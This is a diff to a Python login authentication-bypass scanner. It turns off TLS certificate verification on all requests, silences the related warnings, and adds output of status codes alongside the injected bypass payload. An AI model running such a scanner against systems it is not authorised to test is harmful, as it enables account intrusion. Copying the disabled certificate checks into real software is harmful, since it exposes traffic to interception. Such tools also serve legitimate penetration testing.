@@ -4,6 +4,9 @@
 import requests,argparse,sys
 from time import sleep
 
+from urllib3.exceptions import InsecureRequestWarning
+requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
+
 parser = argparse.ArgumentParser()
 parser.add_argument("-t",help="Target URL")
 parser.add_argument("-u",help="Username parameter")
@@ -21,17 +24,17 @@ if (args.t is None) or (args.u is None) or (args.p is None):
 	
 def get_request(data):
 	global args
-	response = requests.get(args.t,params=data,allow_redirects=False)
+	response = requests.get(args.t,params=data,allow_redirects=False,verify=False)
 	return response.status_code , response.text , response.request.url
 
 def post_request_json(data):
 	global args
-	response = requests.post(args.t,json=data,allow_redirects=False)
+	response = requests.post(args.t,json=data,allow_redirects=False,verify=False)
 	return response.status_code , response.text, response.request.body
 	
 def post_request(data):
 	global args
-	response = requests.post(args.t,data=data,allow_redirects=False)
+	response = requests.post(args.t,data=data,allow_redirects=False,verify=False)
 	return response.status_code , response.text, response.request.body
 	
 # inject an invalid credential
@@ -86,6 +89,7 @@ data.clear()
 bypass_code , bypass_text , payload = bypass(data,1)
 if template_code != bypass_code:
 	print("[+] Login is probably VULNERABLE to GET request auth bypass!")
+	print("[!] Status code: {} --> {}\n".format(str(template_code),str(bypass_code)))
 	print("[!] PAYLOAD: {}\n".format(payload))
 elif template_text != bypass_text:
 	print("[+] Login is probably VULNERABLE to GET request auth bypass!")
@@ -103,6 +107,7 @@ data.clear()
 bypass_code , bypass_text, payload = bypass(data,2)
 if template_code != bypass_code:
 	print("[+] Login is probably VULNERABLE to POST request auth bypass!")
+	print("[!] Status code: {} --> {}\n".format(str(template_code),str(bypass_code)))
 	print("[!] PAYLOAD: {}\n".format(payload))
 elif template_text != bypass_text:
 	print("[+] Login is probably VULNERABLE to POST request auth bypass!")
@@ -120,6 +125,7 @@ data.clear()
 bypass_code , bypass_text , payload = bypass(data,3)
 if template_code != bypass_code:
 	print("[+] Login is probably VULNERABLE to POST JSON request auth bypass!")
+	print("[!] Status code: {} --> {}\n".format(str(template_code),str(bypass_code)))
 	print("[!] PAYLOAD: {}\n".format(payload.decode()))
 elif template_text != bypass_text:
 	print("[+] Login is probably VULNERABLE to POST JSON request auth bypass!")
